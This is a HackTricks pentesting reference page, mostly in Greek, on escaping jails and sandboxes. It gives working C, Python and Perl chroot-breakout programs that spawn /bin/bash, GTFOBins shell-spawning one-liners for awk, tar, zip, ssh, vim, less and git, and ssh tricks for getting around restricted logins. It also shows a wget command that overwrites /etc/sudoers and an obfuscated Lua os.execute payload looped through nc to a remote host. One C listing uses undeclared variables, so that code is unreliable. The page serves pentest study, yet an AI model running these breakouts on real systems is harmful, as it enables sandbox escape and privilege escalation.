# Διαφυγή από Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Search in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **αν μπορείς να εκτελέσεις οποιοδήποτε binary με ιδιότητα "Shell"**

## Chroot Escapes

Από [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Ο μηχανισμός chroot **δεν προορίζεται να προστατεύει** από εσκεμμένη παραβίαση από **privileged** (**root**) **users**. Στα περισσότερα systems, τα chroot contexts δεν στοιβάζονται σωστά και τα προγράμματα σε chroot **με επαρκή privileges μπορούν να κάνουν δεύτερο chroot για να διαφύγουν**.\
Συνήθως αυτό σημαίνει ότι για να διαφύγεις πρέπει να είσαι root μέσα στο chroot.

> [!TIP]
> Το **tool** [**chw00t**](https://github.com/earthquake/chw00t) δημιουργήθηκε για να εκμεταλλεύεται τα παρακάτω escenarios και να ξεφεύγει από `chroot`.

### Root + CWD

> [!WARNING]
> Αν είσαι **root** μέσα σε ένα chroot, μπορείς να **διαφύγεις** δημιουργώντας **άλλο chroot**. Αυτό συμβαίνει επειδή 2 chroots δεν μπορούν να συνυπάρχουν (στο Linux), οπότε αν δημιουργήσεις έναν φάκελο και μετά **δημιουργήσεις ένα νέο chroot** σε εκείνον τον νέο φάκελο, ενώ **εσύ βρίσκεσαι έξω από αυτόν**, τώρα θα είσαι **έξω από το νέο chroot** και επομένως θα βρίσκεσαι στο FS.
>
> Αυτό συμβαίνει επειδή συνήθως το chroot ΔΕΝ μετακινεί το working directory σου στο καθορισμένο, οπότε μπορείς να δημιουργήσεις ένα chroot αλλά να είσαι έξω από αυτό.

Συνήθως δεν θα βρεις το `chroot` binary μέσα σε ένα chroot jail, αλλά θα μπορούσες να το **compile, upload and execute** ως binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Αυτό είναι παρόμοιο με την προηγούμενη περίπτωση, αλλά σε αυτήν την περίπτωση ο **attacker αποθηκεύει έναν file descriptor για τον τρέχοντα κατάλογο** και μετά **δημιουργεί το chroot σε έναν νέο φάκελο**. Τέλος, καθώς έχει **access** σε αυτό το **FD** **έξω** από το chroot, το προσπελαύνει και **escapes**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> Το FD μπορεί να περάσει μέσω Unix Domain Sockets, οπότε:
>
> - Create a child process (fork)
> - Create UDS so parent and child can talk
> - Run chroot in child process in a different folder
> - In parent proc, create a FD of a folder that is outside of new child proc chroot
> - Pass to child procc that FD using the UDS
> - Child process chdir to that FD, and because it's ouside of its chroot, he will escape the jail

### Root + Mount

> [!WARNING]
>
> - Mounting root device (/) into a directory inside the chroot
> - Chrooting into that directory
>
> Αυτό είναι δυνατό στο Linux

### Root + /proc

> [!WARNING]
>
> - Mount procfs into a directory inside the chroot (if it isn't yet)
> - Look for a pid that has a different root/cwd entry, like: /proc/1/root
> - Chroot into that entry

### Root(?) + Fork

> [!WARNING]
>
> - Create a Fork (child proc) and chroot into a different folder deeper in the FS and CD on it
> - From the parent process, move the folder where the child process is in a folder previous to the chroot of the children
> - This children process will find himself outside of the chroot

### ptrace

> [!WARNING]
>
> - Πριν από καιρό οι χρήστες μπορούσαν να debug τα δικά τους processes από ένα process του ίδιου τους του εαυτού... αλλά αυτό δεν είναι πλέον δυνατό από προεπιλογή
> - Anyway, if it's possible, you could ptrace into a process and execute a shellcode inside of it ([see this example](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Get info about the jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Τροποποίησε το PATH

Έλεγξε αν μπορείς να τροποποιήσεις τη μεταβλητή περιβάλλοντος PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Χρήση του vim
```bash
:set shell=/bin/sh
:shell
```
### Pagers and help viewers

Πολλά περιορισμένα περιβάλλοντα εξακολουθούν να αφήνουν διαθέσιμα **pagers** ή **help viewers**. Αυτά συνήθως είναι πιο γρήγορο να καταχραστείς από το να προσπαθήσεις να ξαναφτιάξεις το `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Αν το `git` είναι διαθέσιμο, θυμήσου ότι η έξοδος βοήθειάς του συνήθως περνάει μέσω pager:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Συνήθεις one-liners GTFOBins

Αφού ξέρεις ποια binaries είναι προσβάσιμα, δοκίμασε πρώτα τους προφανείς shell spawners:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Αν μπορείτε μόνο να **inject arguments** σε μια επιτρεπόμενη εντολή (αντί να την εκτελείτε ελεύθερα), ελέγξτε επίσης το **GTFOArgs**.

### Δημιουργία script

Ελέγξτε αν μπορείτε να δημιουργήσετε ένα εκτελέσιμο αρχείο με περιεχόμενο το _/bin/bash_
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Πάρτε bash από SSH

Αν αποκτάτε πρόσβαση μέσω ssh, μπορείτε συχνά να ζητήσετε από τον server να εκτελέσει ένα **διαφορετικό πρόγραμμα** αντί για το περιορισμένο login shell:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Αν το `ssh` είναι ένα από τα λίγα τοπικά επιτρεπόμενα binaries, θυμήσου ότι μπορεί επίσης να γίνει abuse ως **GTFOBin**:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Δήλωσε
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Μπορείς να αντικαταστήσεις, για παράδειγμα, το αρχείο sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Ορισμένα περιβάλλοντα δεν σε ρίχνουν σε απλό `rbash`, αλλά σε **wrappers** όπως `git-shell`, `rssh`, ή `lshell`:

- Το `git-shell` δέχεται μόνο server-side Git commands μαζί με οτιδήποτε υπάρχει μέσα στο `~/git-shell-commands/`. Αν υπάρχει αυτός ο κατάλογος, τρέξε `help` για να απαριθμήσεις τις επιτρεπόμενες custom actions. Αν μπορείς να γράψεις εκεί, οποιοδήποτε executable τοποθετηθεί σε αυτόν τον κατάλογο γίνεται προσβάσιμο.
- Τα `rssh` / `lshell` συνήθως επιτρέπουν μόνο `scp`, `sftp`, `rsync`, ή Git-style operations. Σε αυτές τις περιπτώσεις, εστίασε πρώτα σε **file write primitives**: ανέβασε `authorized_keys`, ένα shell startup file, ή ένα helper script σε ένα writable location και μετά ξανασυνδέσου με `ssh -t ...`.
- Αν το wrapper φιλτράρει μόνο το command line, απαρίθμησε τα reachable binaries και μετά γύρνα πίσω στα **GTFOBins / GTFOArgs**.

### Άλλα tricks

Έλεγξε επίσης:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Θα μπορούσε επίσης να είναι ενδιαφέρουσα η σελίδα:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Tricks about escaping from python jails in the following page:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Σε αυτή τη σελίδα μπορείς να βρεις τις global functions στις οποίες έχεις πρόσβαση μέσα στο lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval with command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Μερικά tricks για να **καλέσετε functions μιας library χωρίς να χρησιμοποιείτε τελείες**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Απαρίθμησε τις functions μιας library:
```bash
for k,v in pairs(string) do print(k,v) end
```
Σημείωσε ότι κάθε φορά που εκτελείς το προηγούμενο one liner σε ένα **διαφορετικό lua environment η σειρά των functions αλλάζει**. Επομένως, αν χρειάζεται να εκτελέσεις μια συγκεκριμένη function, μπορείς να κάνεις ένα brute force attack φορτώνοντας διαφορετικά lua environments και καλώντας την πρώτη function της le library:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Απόκτησε διαδραστικό lua shell**: Αν βρίσκεσαι μέσα σε ένα περιορισμένο lua shell, μπορείς να πάρεις ένα νέο lua shell (και ελπίζουμε απεριόριστο) καλώντας:
```bash
debug.debug()
```
## Αναφορές

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
